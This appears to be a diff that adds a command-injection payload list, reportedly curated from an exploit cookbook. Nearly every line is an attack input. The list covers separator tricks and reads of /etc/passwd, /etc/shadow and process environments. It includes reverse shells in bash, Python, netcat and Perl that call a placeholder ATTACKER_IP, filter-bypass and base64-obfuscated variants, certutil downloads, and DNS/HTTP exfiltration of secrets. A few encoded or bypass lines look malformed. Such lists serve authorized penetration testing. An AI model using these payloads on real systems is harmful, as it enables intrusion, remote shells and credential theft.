@@ -1,0 +1,104 @@
+# Command Injection Payloads - Curated from exploit-cookbook
+# Source: proven-exploits.md + security-arsenal-argus.md
+
+# Basic injection
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+$(whoami)
+`whoami`
+; id
+| id
+
+# Data exfiltration
+; cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+; cat /proc/self/environ
+; env
+; set
+; export
+
+# Reverse shell
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; nc -e /bin/sh ATTACKER_IP 4444
+; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'
+
+# Blind injection detection
+; sleep 5
+| sleep 5
+; ping -c 5 ATTACKER_IP
+$(sleep 5)
+`sleep 5`
+
+# Bypass filters
+; c'a't /etc/passwd
+; c"a"t /etc/passwd
+; cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+; {cat,/etc/passwd}
+; cat</etc/passwd
+; cat /etc/pass[w]d
+
+# WAF / filter bypass
+; %73leep%205
+; s%65ep 5
+; sl?ep 5
+; ca?t /etc/passwd
+; *cat* /etc/passwd
+; c-a-t /etc/passwd
+; $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh)
+; $(echo Y3VybCBodHRwOi8vQVRUQUNLRVJfSVAvP2M9ZGF0YSB8IGNhdCAvZXRjL3Bhc3N3ZA== | base64 -d)
+; $(printf 'w/bi g' | xargs)
+; $(rev ipmaw)
+; $(echo 'wHk4aHJnaDIgJDEgJDIgfCBwb3dlcnNoZWxs' | base64 -d -0 2>/dev/null; echo x)
+; cat "$(echo L2V0Yy9wYXNzd2Q= | base64 -d)"
+; sleep$'\x20'5
+; $'s\x65leep' 5
+; \x73leep\x205
+; ?*?*sleep?*? 5
+
+# Encoding / obfuscation
+; echo "Y2F0IC9ldGMvcGFzc3dk" | b64 -d
+; echo c2MgMj4vZGV2L251bGw= | base64 -d | sh
+; perl -MIO -e 'system("c"."a"."t /etc/passwd")'
+; python -c "import os;os.system('cat /etc/passwd')"
+; ruby -e 'system("id")'
+; php -r 'system("id");'
+
+# Windows / IIS specific
+; whoami
+& whoami
+| type C:\Windows\win.ini
+; powershell -enc JABzAD0ATgBvAG4AZQA=
+; rundll32.exe shell32.dll,Control_RunDLL cmd /k whoami
+| reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+; certutil -urlcache -split -f http://ATTACKER_IP/x.txt C:\tmp\x.txt
+
+# Unix / Linux data exfil
+; id > /tmp/pwned 2>&1
+; curl http://ATTACKER_IP/c?d=$(whoami)
+; wget --post-data=$(id) http://ATTACKER_IP/c
+; nc ATTACKER_IP 4444 -e /bin/sh
+; python3 -c 'import urllib.request;urllib.request.urlopen("http://ATTACKER_IP/c?h=1")'
+; nslookup "$(whoami).ATTACKER_IP"
+; ping -n 5 "$(hostname)"
+; dig A $(id | base64 | head -c 40).ATTACKER_IP
+
+# DNS / OOB exfil
+; dig A $(cat /etc/passwd | base64 | tr -d '\n' | cut -c1-60).exfil.ATTACKER_IP
+; curl -s http://ATTACKER_IP/$(id | sed 's/[^a-z0-9]//g')
+; wget -qO- http://ATTACKER_IP/$(whoami | xxd -p)
+
+# Chained / multi-stage
+; touch /tmp/.marker; curl http://ATTACKER_IP/$(cat /tmp/.marker)
+; rm -rf /tmp/x; mkfifo /tmp/x; cat /tmp/x | /bin/sh -i | nc ATTACKER_IP 4444 >/dev/null
+; echo 'Qh' > /tmp/.s; cat /etc/shadow >> /tmp/.s; curl -F f=@/tmp/.s http://ATTACKER_IP/x; rm -f /tmp/.s
+
+# LFI-to-CMDI bridges
+; /etc/passwd
+; /proc/self/environ
+; /dev/stdin
